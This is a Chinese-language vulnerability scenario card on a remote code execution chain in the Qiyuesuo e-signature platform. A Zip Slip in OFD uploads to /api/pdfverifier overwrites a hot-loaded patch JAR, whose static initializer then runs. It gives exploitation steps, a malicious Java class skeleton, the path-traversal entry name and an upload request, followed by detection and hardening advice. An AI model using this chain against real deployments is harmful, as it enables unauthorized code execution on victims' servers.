---
id: web-java-component-qiyuesuo-ofd-zipslip-hotpatch-jar-rce
title: 契约锁 OFD 上传 Zip Slip 覆盖热补丁 JAR：热加载 static 块执行 RCE
type: scenario
domain: web
path: web/java/component
technique: qiyuesuo-ofd-zipslip-hotpatch-jar-rce
aliases:
- 契约锁 RCE
- qiyuesuo pdfverifier
- OFD Zip Slip
- private-security-patch.jar
- 热加载补丁 RCE
- SecurityLibManager
tags:
- java
- qiyuesuo
- zip-slip
- hot-reload
- patch
- rce
- file-upload
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V213
  verified_at: '2026-11-07T04:23:35+08:00'
  notes: 已对照原文核对：/api/pdfverifier、OFD Zip Slip、../../../../opt/qiyuesuo/security/private-security-patch.jar、com.qiyuesuo.security.patch.filter.logic 前缀、private-security-loader 哈希检查与 static 块执行均与原文叙述一致；原文为二手转述无 PoC/截图，卡已标 confidence=medium 并说明，保留。
---

## 一句话结论

契约锁电子签署平台的 `/api/pdfverifier` 接口接收 OFD（本质是 ZIP）并在服务端解压时存在 Zip Slip；攻击者构造条目名为 `../../../../opt/qiyuesuo/security/private-security-patch.jar` 的恶意 OFD，覆盖合法热补丁 JAR，`private-security-loader` 检测到哈希变化后自动重新加载并实例化 `com.qiyuesuo.security.patch.filter.logic.*` 类，恶意类的静态代码块随类加载执行，形成 RCE。

## 原理

- OFD 文件本质是 ZIP 容器；平台在处理上传的 OFD 时解压其中的条目，若直接把条目名拼到解压目录后写文件，`../` 就能跳出解压目录（Zip Slip），写入任意路径。
- 契约锁的 `private-security-loader-1.0.0.jar`（`SecurityLibManager` 类）会定时检查 `/opt/qiyuesuo/security/private-security-patch.jar` 的哈希，发现变化后重新加载该 JAR，并扫描/实例化 `com.qiyuesuo.security.patch.filter.logic` 包下的类。
- Java 类在初始化时会执行静态代码块（`static { ... }`）。攻击者把恶意类放进被覆盖的补丁 JAR，类被实例化时静态块自动执行，无需调用任何方法。
- 为保证兼容性，攻击者通常不从头构造 JAR，而是下载官方 `private-security-patch.jar`，用 `jar`/7-Zip 把恶意 class 添加进去，再作为 OFD 的条目上传覆盖。
- 利用链：恶意 OFD 上传 → Zip Slip 覆盖热补丁 JAR → 热加载组件检测哈希变化 → 重新加载并实例化类 → 静态块执行恶意代码。

## 触发条件

- 目标为存在该问题的契约锁版本，`/api/pdfverifier` 接口可访问并能处理 OFD 上传。
- 应用对 `/opt/qiyuesuo/security/` 有写权限，且热补丁 JAR 路径固定/可预测。
- `private-security-loader` 热加载组件正在运行，且只校验哈希/文件变化、不校验签名。
- 攻击者能构造带 `../` 条目的 ZIP/OFD，并知道目标操作系统路径（Linux 为 `/opt/qiyuesuo/security/`）。

## 利用步骤

1. 获取官方 `private-security-patch.jar`，确认热加载组件扫描的包名前缀 `com.qiyuesuo.security.patch.filter.logic`。
2. 编写恶意类（如 `com.qiyuesuo.security.patch.filter.logic.AAAAA`），把要执行的代码放进 `static {}` 块；编译后加入官方 JAR，保持其余内容不变。
3. 构造 OFD/ZIP，添加一个文件条目，条目名设为 `../../../../opt/qiyuesuo/security/private-security-patch.jar`（按解压目录深度调整 `../` 数量），内容为恶意 JAR。
4. 通过 `/api/pdfverifier` 上传该 OFD；服务端解压时覆盖目标 JAR。
5. 等待热加载组件检测到文件变化并重新加载；静态代码块执行，验证命令执行/内存马注入。
6. 授权测试中用无害命令（`id`/DNSLog）验证，不写入真实敏感数据。

## PoC

恶意类骨架（仅示意静态块执行）：

```java
package com.qiyuesuo.security.patch.filter.logic;

public class AAAAA {
    static {
        try {
            Runtime.getRuntime().exec("id");
        } catch (Exception e) {
        }
    }
}
```

ZIP 条目名（按实际解压目录调整）：

```text
../../../../opt/qiyuesuo/security/private-security-patch.jar
```

上传请求（接口与字段以目标为准）：

```http
POST /api/pdfverifier HTTP/1.1
Host: victim
Content-Type: multipart/form-data; boundary=----x

------x
Content-Disposition: form-data; name="file"; filename="evil.ofd"
Content-Type: application/octet-stream

<OFD/ZIP bytes with traversal entry>
------x--
```

说明：文章引用的第三方博客给出了完整利用链；本文未提供可直接运行的 EXP，需按目标版本/路径调整。

## 变体与关联

- 变体：覆盖其他热加载 JAR、热更新配置、classpath 下的类文件；利用热加载组件的哈希检查触发重新加载。
- 变体：若接口只允许 OFD，可在 OFD 容器中嵌入 ZIP 条目；若允许 ZIP，直接上传 ZIP。
- 关联：[[web-generic-file-upload-zip-slip-webshell-write]]（通用 Zip Slip 任意文件写）。
- 关联：[[web-java-component-onlyoffice-runtime-config-hot-reload-downgrade]]（热加载配置被篡改导致鉴权降级，本卡是热加载 JAR 被覆盖导致 RCE）。
- 边界：目标对解压条目做规范化/拒绝 `..`、热补丁 JAR 有签名校验且私钥不可得、热加载目录不可写时，该链路不成立。

## 检测与防御

- 检测：OFD/ZIP 上传中出现 `../`、绝对路径条目；`/opt/qiyuesuo/security/` 下的 JAR 哈希/大小变化；热加载组件在非升级时间重新加载补丁。
- 防御：解压前规范化条目路径并拒绝跳出目标目录（`realpath` 校验）；热补丁 JAR 使用数字签名并在加载前验签，不能只校验哈希。
- 加固：热加载目录设置最小写权限；上传接口限制文件类型/大小并做病毒扫描；监控安全目录的文件变更；及时升级厂商修复版本。
